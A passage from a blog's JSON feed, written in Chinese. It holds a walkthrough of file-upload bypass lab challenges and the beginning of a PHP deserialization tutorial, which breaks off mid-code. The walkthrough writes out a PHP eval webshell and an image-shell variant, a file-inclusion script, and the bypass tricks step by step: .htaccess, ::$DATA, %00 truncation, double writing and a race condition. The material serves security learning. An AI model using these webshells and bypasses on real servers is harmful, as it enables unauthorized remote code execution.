            "content_html": "<h3 id=\"第一题\"><a class=\"markdownIt-Anchor\" href=\"#第一题\">#</a> 第一题</h3>\n<p>一句话木马</p>\n<p>phpinfo();<br>\n@eval($_POST[‘zoe’]);<br>\n?&gt;</p>\n<p>1. 将 php 后缀改成 png/gif 等符合条件的后缀上传抓包，将后缀改成 php 放包即可成功上传<br>\n用蚁剑添加数据<br>\n 2.F12-&gt; 调试器 -&gt; 设置里禁用 js<br>\n3. 复制网页源代码保存到文件中，删掉里面的 js 部分，添加 action 部分，打开即可</p>\n<h3 id=\"第二题\"><a class=\"markdownIt-Anchor\" href=\"#第二题\">#</a> 第二题</h3>\n<p>MIME 类型<br>\n抓包改 content-type 为符合条件的就行<br>\n eg.image-png</p>\n<h3 id=\"第三题\"><a class=\"markdownIt-Anchor\" href=\"#第三题\">#</a> 第三题</h3>\n<p>黑名单类型 - 修改后缀绕过</p>\n<ul>\n<li>用黑名单不允许上传 <code>.asp,.aspx,.php,.jsp</code>  后缀的文件</li>\n<li>但可以上传 <code>.phtml .phps .php5 .pht</code></li>\n<li><mark>首选 phtml</mark></li>\n<li>前提是 apache 的 httpd.conf 中有如下配置代码</li>\n<li>AddType application/x-httpd-php .php .phtml .phps .php5 .pht</li>\n</ul>\n<h3 id=\"第四题\"><a class=\"markdownIt-Anchor\" href=\"#第四题\">#</a> 第四题</h3>\n<p>.htaccess<br>\n 先将 httpd.conf 的文件中的 AllowOverride none 改为 ALL<br>\n1 <code>AddType application/x-httpd-php .jpg</code>  这个指令代表着 <code>.jpg</code>  文件会当做 <code>php</code>  来解析<br>\n传个 zoe.jpg</p>\n<p>2 <code>SetHandler application/x-httpd-php</code> ，意思是把所有文件都解析为 <code>php</code>  文件来执行。<br>\n写第二个命名为.htaccess 传上去<br>\n<span class=\"exturl\" data-url=\"aHR0cDovL3huLS16b2UtaTY4ZHo3Yi54eHg=\">传个 zoe.xxx</span>, 随便什么后缀符合要求就行</p>\n<p>3. 可以用第十题的解法，利用 deldot 的漏洞</p>\n<p>补充：(原本多出的第五题)<br>\n 在 Windows 操作系统中，xx.jpg. 和 xx.jpg 空格都相当于 xx.jpg, 自动去掉了末尾的。和空格<br>\n后缀名可以是 zoe.php. .</p>\n<h3 id=\"第六题\"><a class=\"markdownIt-Anchor\" href=\"#第六题\">#</a> 第六题</h3>\n<p>此题的源码可以发现少了 strtolower 函数<br>\n黑名单之大小写绕过<br>\n将后缀改成 Php 即可</p>\n<h3 id=\"第七题\"><a class=\"markdownIt-Anchor\" href=\"#第七题\">#</a> 第七题</h3>\n<p>黑名单验证之空格绕过<br>\n这一关黑名单，没有使用 trim () 去除空格，可以使用空格绕过黑名单<br>\n bp 抓包在 content-disposition 中 php 后加个空格</p>\n<h3 id=\"第八题\"><a class=\"markdownIt-Anchor\" href=\"#第八题\">#</a> 第八题</h3>\n<p>这一关黑名单，没有使用 deldot () 过滤文件名末尾的 <code>点</code> ，可以使用文件名后加。进行绕过<br>\n抓包修改    .php. 注意这里有个.</p>\n<h3 id=\"第九题\"><a class=\"markdownIt-Anchor\" href=\"#第九题\">#</a> 第九题</h3>\n<p>特殊字符::<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>D</mi><mi>A</mi><mi>T</mi><mi>A</mi><mtext>绕过补充知识：</mtext><mi>p</mi><mi>h</mi><mi>p</mi><mtext>在</mtext><mi>w</mi><mi>i</mi><mi>n</mi><mi>d</mi><mi>o</mi><mi>w</mi><mtext>的时候如果文件名</mtext><mo>+</mo><mi mathvariant=\"normal\">&quot;</mi><mo>:</mo><mo>:</mo></mrow><annotation encoding=\"application/x-tex\">DATA绕过\n补充知识：php在window的时候如果文件名+&quot;::</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span><span class=\"mord mathnormal\">A</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord mathnormal\">A</span><span class=\"mord cjk_fallback\">绕</span><span class=\"mord cjk_fallback\">过</span><span class=\"mord cjk_fallback\">补</span><span class=\"mord cjk_fallback\">充</span><span class=\"mord cjk_fallback\">知</span><span class=\"mord cjk_fallback\">识</span><span class=\"mord cjk_fallback\">：</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">p</span><span class=\"mord cjk_fallback\">在</span><span class=\"mord mathnormal\" style=\"margin-right:0.02691em;\">w</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\" style=\"margin-right:0.02691em;\">w</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">时</span><span class=\"mord cjk_fallback\">候</span><span class=\"mord cjk_fallback\">如</span><span class=\"mord cjk_fallback\">果</span><span class=\"mord cjk_fallback\">文</span><span class=\"mord cjk_fallback\">件</span><span class=\"mord cjk_fallback\">名</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord\">&quot;</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mrel\">:</span></span></span></span>DATA&quot; 会把::<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>D</mi><mi>A</mi><mi>T</mi><mi>A</mi><mtext>之后的数据当成文件流处理</mtext><mo separator=\"true\">,</mo><mtext>不会检测后缀名，且保持</mtext><mi mathvariant=\"normal\">&quot;</mi><mo>:</mo><mo>:</mo></mrow><annotation encoding=\"application/x-tex\">DATA之后的数据当成文件流处理,不会检测后缀名，且保持&quot;::</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span><span class=\"mord mathnormal\">A</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord mathnormal\">A</span><span class=\"mord cjk_fallback\">之</span><span class=\"mord cjk_fallback\">后</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">数</span><span class=\"mord cjk_fallback\">据</span><span class=\"mord cjk_fallback\">当</span><span class=\"mord cjk_fallback\">成</span><span class=\"mord cjk_fallback\">文</span><span class=\"mord cjk_fallback\">件</span><span class=\"mord cjk_fallback\">流</span><span class=\"mord cjk_fallback\">处</span><span class=\"mord cjk_fallback\">理</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord cjk_fallback\">不</span><span class=\"mord cjk_fallback\">会</span><span class=\"mord cjk_fallback\">检</span><span class=\"mord cjk_fallback\">测</span><span class=\"mord cjk_fallback\">后</span><span class=\"mord cjk_fallback\">缀</span><span class=\"mord cjk_fallback\">名</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">且</span><span class=\"mord cjk_fallback\">保</span><span class=\"mord cjk_fallback\">持</span><span class=\"mord\">&quot;</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mrel\">:</span></span></span></span>DATA&quot; 之前的文件名 他的目的就是不检查后缀名。<br>\n抓包改后缀，php::<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>D</mi><mi>A</mi><mi>T</mi><mi>A</mi><mtext>浏览器地址去掉</mtext><mo>:</mo><mo>:</mo></mrow><annotation encoding=\"application/x-tex\">DATA\n浏览器地址去掉::</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span><span class=\"mord mathnormal\">A</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord mathnormal\">A</span><span class=\"mord cjk_fallback\">浏</span><span class=\"mord cjk_fallback\">览</span><span class=\"mord cjk_fallback\">器</span><span class=\"mord cjk_fallback\">地</span><span class=\"mord cjk_fallback\">址</span><span class=\"mord cjk_fallback\">去</span><span class=\"mord cjk_fallback\">掉</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mrel\">:</span></span></span></span>data 就可以正常连接</p>\n<h3 id=\"第十题\"><a class=\"markdownIt-Anchor\" href=\"#第十题\">#</a> 第十题</h3>\n<p>这一关黑名单，最后上传路径直接使用文件名进行拼接，而且只对文件名进行<br>\n f i l e n a m e = d e l d o t (file_name) 操作去除文件名末尾的点，构造后缀绕过黑名单<br>\n补充知识：deldot () 函数从后向前检测，当检测到末尾的第一个点时会继续它的检测，但是遇到空格会停下来<br>\n上传 zoe.php 然后用 bp 改后缀加点 == <code>空格点</code>  ==（即文件名为 <code>zoe.php. .</code> ）</p>\n<p>使用 antsword 连接   <mark>.php.</mark></p>\n<p>十一.<br>\n 双写绕过<br>\n这一关黑名单，使用 str_ireplace () 函数寻找文件名中存在的黑名单字符串，将它替换成空（即将它删掉），可以使用双写绕过黑名单</p>\n<blockquote>\n<p>补充知识：str_ireplace (find,replace,string,count) 函数替换字符串中的一些字符<br>\n传 <code>zoe.php</code>  然后用 bp 改后缀为 <code>.pphphp</code>  使用蚁剑连接 <code>zoe.php</code></p>\n</blockquote>\n<p>十二.get00 截断<br>\n这一关白名单，最终文件的存放位置是以拼接的方式，可以使用 %00 截断，但需要 <code>php版本&lt;5.3.4</code> ，并且 <code>magic_quotes_gpc</code>  关闭。<br>\n原理：php 的一些函数的底层是 C 语言，而 move_uploaded_file 就是其中之一，遇到 0x00 会截断，0x 表示 16 进制，URL 中 %00 解码成 16 进制就是 0x00。</p>\n<p>上传 <code>zoe.php</code>  用 BP 抓包修改参数，把 upload / 后面加上 <code>zoe.php%00</code> ，下面的 <code>filename=”zoe.php”</code>  改为 <code>zoe.png</code> <br>\n 用 antsword 连接时要删掉后面的注释</p>\n<p>十三.post00 截断<br>\n这一关白名单，文件上传路径拼接生成，而且使用了 post 发送的数据进行拼接，我们可以控制 post 数据进行 0x00 截断绕过白名<br>\n一句话木马抓包 zoe.php<br>\n 在 <code>../upload/</code>  路径下加上 <code>zoe.php+</code>   <code>+号</code> 是为了方便后面修改 <code>Hex</code> <br>\n <code>+号</code> 的 Hex 是 <code>2b</code> ，这里我们要把它改为 <code>00</code></p>\n<p>十四：图片马 unpack<br>\n 可以先传一个 14.php (文件包含) 到服务器，可以选择别的题目传到服务器，<mark> 目的是解析传入的图片为 PHP</mark></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">header(&quot;Content-Type:text/html;charset=utf-8&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">$file=$_GET[&#x27;file&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\">if(isset($file))&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    include $file;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    show_source(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>再传一个图片马，14.jpg</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GIF89a</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">phpinfo();</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>打开 14.php 的路径，url 输入？file = 图片马的路径</p>\n<p>补充：图片马制作<br>\n<strong>制作图片马命令</strong>：copy 图片文件名称 /b + 脚本文件名称 /a  新生成的文件名称，例如：copy 222.jpg/b+111.php/a 333.jpg<br>\n1. 先写 jpg 文件:<br>\nGIF89a<br>\n?&lt;php<br>\n@eval($_POST[‘shell’]);<br>\n?&gt;<br>\n2. 再写 php 文件<br>\n直接复制粘贴给我文件包含<br>\n 3. 制作图片马<br>\n cmd 命令：13.jpg/b+13.php/a pass13.jpg<br>\n 之间上传 pass13.jpg 将图片地址给 antsword 连接</p>\n<h1 id=\"十五getimagesize图片马\"><a class=\"markdownIt-Anchor\" href=\"#十五getimagesize图片马\">#</a> 十五 getimagesize 图片马</h1>\n<p>与上一题一样<br>\n补充:getimagesize () 函数的作用是获取图片文件的相关信息</p>\n<p>十六。跟 14,15 一样，通过文件包含和图片马 getshell</p>\n<p>十七。二次渲染绕过</p>\n<p>上传正常的 <code>GIF</code>  图片下载回显的图片，用 notepad++ 编辑器进行对比两个 GIF 图片内容，插入一句话木马，需要 python 脚本实现</p>\n<p>十八。条件竞争<br>\n看代码，它是先把图片上传上去，才开始进行判断后缀名。如果我们在上传上去的一瞬间访问这个文件，那他就不能对这个文件删除，二次渲染等等。就相当于我们打开了一个文件，然后再去删除这个文件，就会提示这个文件在另一程序已经打开无法删除<br>\n用 burp 抓包 -&gt; 导入到 intruder 模块 -&gt; 设置类型为 null payloads,payload options 设置为 conntinue indefinitely-&gt; 在另一浏览器打开上传文件位置</p>\n<p>十九。操作与上一关差不多，配合包含漏洞</p>\n<p>二十.move_upload_file 的漏洞，会忽略 /.<br>\n1. 加 /.<br>\n2.save_name 用 %00 阶段 (PHP 版本小于 5.3)</p>\n<p>二十一<br>\n数组验证</p>\n<p>大佬的图片 https://wwe.lanzoui.com/iFSwwn53jaf<br>\n 构造的 URL 为 <code>include.php?file=upload/31608.gif</code></p>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/04/27/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/",
            "url": "https://hq185187.github.io/2023/04/27/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/",
            "title": "php反序列化漏洞学习",
            "date_published": "2023-04-27T08:33:14.709Z",
            "content_html": "<h2 id=\"1访问控制\"><a class=\"markdownIt-Anchor\" href=\"#1访问控制\">#</a> (1). 访问控制</h2>\n<h3 id=\"1public\"><a class=\"markdownIt-Anchor\" href=\"#1public\">#</a> 1.public</h3>\n<p>公有的类成员可以在任何地方被访问<br>\n序列化后变成 <code>属性名</code></p>\n<h3 id=\"2protected\"><a class=\"markdownIt-Anchor\" href=\"#2protected\">#</a> 2.protected</h3>\n<p>受保护的类成员可以被其本身以及子类和子类访问<br>\n序列号后变成 <code>\\x00*\\x00属性名</code></p>\n<h3 id=\"3private\"><a class=\"markdownIt-Anchor\" href=\"#3private\">#</a> 3.private</h3>\n<p>私有的 1 类成员只能被其定义的所在类访问<br>\n序列化后变成 <code>\\x00类名\\x00属性名</code> <br>\n其中 <code>\\x00</code>  表示空字符，但还是占用一个字符位置 (空格)<br>\n 来看个例子叭</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">People</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$gender</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$age</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;name=<span class=\"string\">&#x27;lxy&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;gender=<span class=\"string\">&#x27;male&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;age=<span class=\"string\">&#x27;23&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"keyword\">new</span> <span class=\"title class_\">People</span>();</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>输出结果为:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">O:6:&quot;People&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;lxy&quot;;s:9:&quot; * gender&quot;;s:4:&quot;male&quot;;s:11:&quot; People age&quot;;s:2:&quot;23&quot;;&#125;</span><br></pre></td></tr></table></figure>\n<p><mark>注意</mark></p>\n<ol>\n<li>如果是 print_r (), 或者 echo 的话，我们是看不到空格的 ( <code>\\x00</code> ), 所以看到的结果是</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">O:6:&quot;People&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;lxy&quot;;s:9:&quot;*gender&quot;;s:4:&quot;male&quot;;s:11:&quot;Peopleage&quot;;s:2:&quot;23&quot;;&#125;</span><br></pre></td></tr></table></figure>\n<ol start=\"2\">\n<li>如果输出语句是 var_dump () 的话，看到的结果是这样</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">string(93) &quot;O:6:&quot;People&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;lxy&quot;;s:9:&quot;\\000*\\000gender&quot;;s:4:&quot;male&quot;;s:11:&quot;\\000People\\000age&quot;;s:2:&quot;23&quot;;&#125;&quot;</span><br></pre></td></tr></table></figure>\n<p>对比可以发现 var_dump 可以发现这个空格哦</p>\n<h2 id=\"2序列化与反序列化\"><a class=\"markdownIt-Anchor\" href=\"#2序列化与反序列化\">#</a> (2). 序列化与反序列化</h2>\n<h3 id=\"1序列化\"><a class=\"markdownIt-Anchor\" href=\"#1序列化\">#</a> 1. 序列化</h3>\n<p>把对象信息转换成二进制串，serialize () 函数</p>\n<h3 id=\"2反序列化\"><a class=\"markdownIt-Anchor\" href=\"#2反序列化\">#</a> 2. 反序列化</h3>\n<p>把转化的二进制串转换为对象，unserialize () 函数</p>\n<h3 id=\"3序列化格式\"><a class=\"markdownIt-Anchor\" href=\"#3序列化格式\">#</a> 3. 序列化格式</h3>\n<h4 id=\"31头部信息\"><a class=\"markdownIt-Anchor\" href=\"#31头部信息\">#</a> 3.1 头部信息</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a:数组,array</span><br><span class=\"line\">b:布尔型,Boolean</span><br><span class=\"line\">d:浮点型,double</span><br><span class=\"line\">i:整数型,integer</span><br><span class=\"line\">O:类,class</span><br><span class=\"line\">N:空,null</span><br><span class=\"line\">s:字符串,string</span><br></pre></td></tr></table></figure>\n<h4 id=\"32-格式\"><a class=\"markdownIt-Anchor\" href=\"#32-格式\">#</a> 3.2 格式</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">对象类型:长度:&quot;类名&quot;:类中变量的个数:&#123;类型:长度:&quot;值&quot;;类型:长度:&quot;值&quot;;....&#125;</span><br><span class=\"line\">eg</span><br><span class=\"line\">O:6:&quot;People&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;lxy&quot;;s:9:&quot;*gender&quot;;s:4:&quot;male&quot;;s:11:&quot;Peopleage&quot;;s:2:&quot;23&quot;;&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"33注意\"><a class=\"markdownIt-Anchor\" href=\"#33注意\">#</a> 3.3 注意</h4>\n<ol>\n<li>序列化只能序列成员 (也就是类里的变量), 不能序列方法</li>\n<li>因为序列化不序列方法，所以反序列化之后如果想正常使用这个对象的话要依托这个类当前作用域存在的条件</li>\n<li>我们的思路就是通关精心构造能被控制的类的属性，利用作用域本身存在的方法发动攻击</li>\n</ol>\n<h3 id=\"4魔术方法\"><a class=\"markdownIt-Anchor\" href=\"#4魔术方法\">#</a> 4. 魔术方法</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__construct()            //类的构造函数，创建对象时触发</span><br><span class=\"line\"></span><br><span class=\"line\">__destruct()             //类的析构函数，对象被销毁时触发</span><br><span class=\"line\"></span><br><span class=\"line\">__call($a,$b)                 //在对象上下文中调用不可访问的方法时触发,protected和private都会调用</span><br><span class=\"line\">$a存储所调用的函数名,$b以数组方式接收多个参数</span><br><span class=\"line\">__callStatic($a,$b)           //同__call($a,$b)</span><br><span class=\"line\"></span><br><span class=\"line\">__get()                  //读取不可访问属性的值时，这里的不可访问包含私有属性或未定义,private</span><br><span class=\"line\"></span><br><span class=\"line\">__set()                  //在给不可访问属性赋值时触发</span><br><span class=\"line\"></span><br><span class=\"line\">__isset()                //当对不可访问属性调用 isset() 或 empty() 时触发</span><br><span class=\"line\"></span><br><span class=\"line\">__unset()                //在不可访问的属性上使用unset()时触发</span><br><span class=\"line\"></span><br><span class=\"line\">__invoke()               //当尝试以调用函数的方式调用一个对象时触发</span><br><span class=\"line\"></span><br><span class=\"line\">__sleep()                //执行serialize()时，先会调用这个方法</span><br><span class=\"line\"></span><br><span class=\"line\">__wakeup()               //执行unserialize()时，先会调用这个方法</span><br><span class=\"line\"></span><br><span class=\"line\">__toString()             //当反序列化后的对象被输出在模板中的时候（转换成字符串的时候）自动调用</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><mark>注意:</mark></p>\n<ol>\n<li>serialize () 函数会检查类中是否存在一个魔术方法。如果存在，该方法会先被调用，然后才执行序列化操作</li>\n<li>toString 被调用的情况</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.  echo($obj)/print($obj)打印时会触发 </span><br><span class=\"line\">2.  反序列化对象与字符串连接时 </span><br><span class=\"line\">3.  反序列化对象参与格式化字符串时 </span><br><span class=\"line\">4.  反序列化对象与字符串进行==比较时（PHP进行==比较的时候会转换参数类型） </span><br><span class=\"line\">5.  反序列化对象参与格式化SQL语句，绑定参数时 </span><br><span class=\"line\">6.  反序列化对象在经过php字符串处理函数，如strlen()、strops()、strcmp()、addslashes()等 </span><br><span class=\"line\">7.  在in_array()方法中，第一个参数时反序列化对象，第二个参数的数组中有__toString()返回的字符串的时候__toString()会被调用 </span><br><span class=\"line\">8.  反序列化的对象作为class_exists()的参数的时候 </span><br></pre></td></tr></table></figure>\n<h3 id=\"5例子\"><a class=\"markdownIt-Anchor\" href=\"#5例子\">#</a> 5. 例子</h3>\n<p>看几个例子深刻理解一下序列化和反序列化叭</p>\n<h4 id=\"51\"><a class=\"markdownIt-Anchor\" href=\"#51\">#</a> 5.1</h4>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">test</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$variable</span> = <span class=\"string\">&#x27;变量反序列化后都要销毁&#x27;</span>; <span class=\"comment\">//公共变量</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$variable2</span> = <span class=\"string\">&#x27;OTHER&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">printvariable</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"variable language_\">$this</span>-&gt;variable.<span class=\"string\">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;__construct&#x27;</span>.<span class=\"string\">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">   